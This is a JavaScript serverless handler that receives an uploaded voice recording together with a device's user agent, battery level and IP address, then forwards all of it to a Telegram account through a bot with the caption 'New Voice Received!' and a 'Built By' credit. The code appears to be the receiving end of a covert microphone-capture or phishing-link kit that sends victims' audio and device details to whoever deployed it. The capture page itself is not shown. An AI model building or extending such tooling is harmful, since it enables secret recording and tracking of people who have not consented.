import { Telegraf } from 'telegraf';
import formidable from 'formidable';
import fs from 'fs';

const bot = new Telegraf(process.env.BOT_TOKEN);

export const config = {
  api: {
    bodyParser: false,
  },
};

export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).send("Only POST allowed");

  const form = formidable({
    multiples: false,
    keepExtensions: true,
    uploadDir: '/tmp', // Vercel only allows writing to /tmp
  });

  form.parse(req, async (err, fields, files) => {
    if (err) {
      console.error("Form parsing error:", err);
      return res.status(500).send("❌ Form parsing failed");
    }

    try {
      const uid = fields.uid;
      const info = JSON.parse(fields.info || '{}');
      const voiceFile = files.voice;

      if (!uid || !voiceFile) {
        return res.status(400).send("❌ Missing uid or voice file");
      }

      // Get file path
      const voicePath = voiceFile.filepath || voiceFile.path;
      if (!voicePath) {
        console.error("❌ No valid file path found in voiceFile:", voiceFile);
        return res.status(500).send("❌ Invalid voice file path");
      }

      const caption = 
`🎤 *New Voice Received!*

📱 *Device:* \`${info.ua || "Unknown"}\`
🔋 *Battery:* \`${info.battery || "?"}%\`
🌐 *IP:* \`${info.ip || "?"}\`

🕒 *Time:* \`${new Date().toLocaleString("en-US", { timeZone: "Asia/Kabul" })}\`

🧑🏻‍💻 Built By: *WACIQ*`;

      await bot.telegram.sendVoice(uid, { source: fs.createReadStream(voicePath) }, {
        caption,
        parse_mode: 'Markdown',
      });

      return res.status(200).send("✅ Voice delivered");
    } catch (error) {
      console.error("Voice send error:", error);
      return res.status(500).send("❌ Failed to send voice message");
    }
  });
} 
